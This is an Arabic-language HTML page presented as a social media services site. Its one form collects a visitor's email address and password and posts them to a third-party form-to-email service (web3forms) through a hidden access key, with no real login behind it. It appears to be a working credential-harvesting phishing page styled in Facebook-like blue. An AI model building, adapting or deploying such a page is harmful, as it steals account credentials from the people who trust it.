<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع خدمات سوشيال ميديا | تسجيل البيانات</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        /* التنسيقات (مُبقاة كما هي من الكود الأصلي) */
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
            direction: rtl; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 20px;
        }
        header nav a {
            color: white; 
            margin: 0 15px;
            text-decoration: none;
            font-weight: 700; 
            transition: color 0.3s;
        }
        header nav a:hover {
            color: #007bff;
        }
        .banner {
            background-color: #007bff;
            color: #fff;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
        }
        .banner p {
            font-size: 1.1em;
            margin-top: 0; 
            margin-bottom: 20px;
        }
        .youtube-btn {
            display: inline-block; 
            background-color: #ff0000;
            color: white;
            padding: 12px 25px; 
            border-radius: 50px; 
            text-decoration: none;
            font-weight: 700;
            font-size: 16px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s, transform 0.2s;
        }
        .youtube-btn:hover {
            background-color: #cc0000;
            transform: translateY(-2px);
        }
        .main-content {
            flex: 1; 
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 10px;
        }
        .form-box-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .box {
            background-color: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 350px;
            max-width: 100%;
            transition: transform 0.3s ease;
        }
        .box:hover {
            transform: translateY(-5px);
        }
        h2 {
            text-align: center;
            color: #0d47a1;
            margin-bottom: 20px;
            font-weight: 700;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #333;
        }
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            padding-left: 45px; 
            border: 2px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.4);
            outline: none;
        }
        .toggle-password {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            color: #666;
            line-height: 1;
        }
        .toggle-password:hover {
            color: #1877f2;
        }
        button {
            background-color: #1877f2;
            color: white;
            padding: 15px 0;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-weight: 700;
            transition: background-color 0.3s ease, box-shadow 0.3s;
            margin-top: 10px;
        }
        button:hover:not(:disabled) { 
            background-color: #166fe5;
            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
        }
        button:disabled { 
            background-color: #a0c3ff;
            cursor: not-allowed;
            opacity: 0.8; 
        }
        .error-message {
            color: #e53935;
            font-size: 14px;
            margin-top: -15px;
            margin-bottom: 15px;
            display: none;
        }
        footer {
            background-color: #333;
            color: #bbb;
            text-align: center;
            padding: 15px 0;
            margin-top: auto; 
            border-top: 3px solid #007bff; 
        }
        .footer-content {
            font-size: 0.9em;
        }
        .footer-content span {
            margin: 0 10px;
            font-weight: bold;
            color: #fff;
        }
    </style>
</head>
<body>

    <header>
        <nav>
            <a href="#">الرئيسية</a>
            <a href="#">حولنا</a>
            <a href="#">اتصل بنا</a>
        </nav>
    </header>

    <div class="banner">
        <p>اكتشف خدماتنا الجديدة الآن!</p>
        
        <a href="https://www.youtube.com/" target="_blank" class="youtube-btn">
            زيارة موقعنا
        </a>
    </div>

    <div class="main-content">
        
        <div class="form-box-wrapper">
            <div class="box">
                <h2>ادخل بياناتك</h2>   
            
                <form id="loginForm" method="POST" action="https://api.web3forms.com/submit">
                    
                    <input type="hidden" name="access_key" value="B2ed5633-7b5f-46c3-b087-5bb11a7da5a0">
                    
                    <input type="hidden" name="redirect" value="thanks.html">

                    
                    <label for="emailInput">البريد الإلكتروني:</label>
                    <div class="input-group">
                        <input type="email" id="emailInput" name="البريد_الإلكتروني" placeholder="أدخل البريد" required>
                    </div>
                    <div class="error-message" id="emailError">الرجاء إدخال البريد الإلكتروني.</div>
                    
                    <label for="passwordInput">كلمة المرور:</label>
                    <div class="input-group">
                        <input type="password" id="passwordInput" name="كلمة_المرور" placeholder="أدخل كلمة المرور" required>
                        <span class="toggle-password" id="togglePassword">👁️</span>
                    </div>
                    <div class="error-message" id="passwordError">الرجاء إدخال كلمة المرور.</div>
                    
                    <button type="submit" id="submitButton" disabled>إرسال</button>
                    
                </form>
            </div>
        </div>
        
    </div> <footer>
        <div class="footer-content">
            <span>©</span>
            جميع الحقوق محفوظة
            <span id="currentYear"></span>
        </div>
    </footer>

<script>
    document.addEventListener('DOMContentLoaded', (event) => {
        document.getElementById('currentYear').textContent = new Date().getFullYear();

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const togglePassword = document.getElementById('togglePassword');
        const submitButton = document.getElementById('submitButton'); 

        function checkInputs() {
            const isEmailValid = emailInput.value.trim() !== '';
            const isPasswordValid = passwordInput.value.trim() !== '';
            submitButton.disabled = !(isEmailValid && isPasswordValid);
        }

        form.addEventListener('submit', function(event) {
            
            let isValid = true;

            if (emailInput.value.trim() === '') {
                emailError.style.display = 'block';
                isValid = false;
            } else {
                emailError.style.display = 'none';
            }

            if (passwordInput.value.trim() === '') {
                passwordError.style.display = 'block';
                isValid = false;
            } else {
                passwordError.style.display = 'none';
            }

            if (!isValid) {
                event.preventDefault(); 
            }
        });

        emailInput.addEventListener('input', function() {
            emailError.style.display = 'none';
            checkInputs(); 
        });

        passwordInput.addEventListener('input', function() {
            passwordError.style.display = 'none';
            checkInputs(); 
        });

        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = (type === 'text') ? '🔒' : '👁️';
        });
        
        checkInputs(); 
    });
</script>

</body>
</html>
